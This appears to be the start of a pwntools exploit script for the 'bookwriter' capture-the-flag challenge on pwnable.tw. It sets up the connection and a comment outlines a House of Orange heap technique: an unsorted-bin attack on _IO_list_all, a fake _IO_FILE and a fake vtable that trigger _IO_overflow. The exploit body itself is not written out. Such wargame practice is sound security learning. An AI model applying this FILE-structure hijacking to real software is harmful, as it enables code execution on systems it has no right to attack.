#!/usr/bin/env python
from pwn import *

# FLAG{}

context.arch = 'amd64'
e , l = ELF('./bookwriter') , ELF('./libc_64.so.6')

#y = process( './bookwriter' , env = {'LD_PRELOAD':'./libc_64.so.6'} )
#y = process( './bookwriter' )
#print util.proc.pidof(y)

host , port = 'chall.pwnable.tw' , 10304
y = remote( host , port )


'''
_unsortbin ->
------------------------------------------
0x0000000000000000 , 0x61                      <- fake size
0x00007ff322123b78 , _IO_list_all - 0x10
........           , ........
------------------------------------------

trigger malloc

_IO_list_all -> 0x00007ff322123b78 point to top chunk in main_arena
offset of smallbin[4] is correct to _chain offset in _IO_file
_chain back to _unsortbin which is a fake _IO_file

fake vtable -> trigger _IO_overflow
'''